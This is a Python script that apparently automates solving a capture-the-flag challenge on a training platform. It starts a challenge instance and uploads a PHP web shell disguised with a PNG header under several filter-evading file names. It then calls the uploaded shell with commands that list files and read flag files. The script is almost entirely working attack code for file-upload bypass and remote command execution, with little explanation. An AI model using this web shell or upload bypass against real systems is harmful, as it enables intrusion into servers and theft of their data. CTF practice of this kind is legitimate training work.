import sys, json, re, time, requests
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

requests.packages.urllib3.disable_warnings()
cy = CyLab(delay=1.2)
cy.login()
FLAG = re.compile(r"(?:academy|picoCTF|PICOCTF)\{[^}]*\}")
cy.req("PUT", "/api/challenges/518/instance/?source=library")
url = None
for _ in range(25):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/518/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        desc = d.get("description") or ""
        cands = [c for c in re.findall(r"https?://[A-Za-z0-9.\-]+\.cylabacademy\.net(?::\d+)?", desc) if "challenge-files" not in c]
        if cands:
            url = cands[0]
            break
print("518:", url)
if url:
    base = url.rstrip("/")
    S = requests.Session()
    S.headers.update({"User-Agent": "Mozilla/5.0"})
    png = bytes.fromhex("89504e470d0a1a0a")
    php = png + b"\n<?php $o=[]; exec($_GET['cmd'].' 2>&1', $o); echo implode(\"\\n\", $o); ?>"
    for name in ("shell.php", "shell.php.png", "shell.png.php", "x.phtml", "shell.pHp"):
        r = S.post(base + "/upload.php", files={"image": (name, php, "image/png")}, timeout=20, verify=False)
        txt = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", r.text or ""))
        print(f"{name} -> {r.status_code} | {txt[:200]}")
    for path in ("/uploads/shell.php", "/upload/shell.php", "/uploads/shell.png.php", "/uploads/shell.pHp"):
        rr = S.get(base + path, params={"cmd": "ls; cat flag.txt; cat /flag.txt"}, timeout=10, verify=False)
        print(f"{path} -> {rr.status_code} | {(rr.text or '')[:200]!r}")
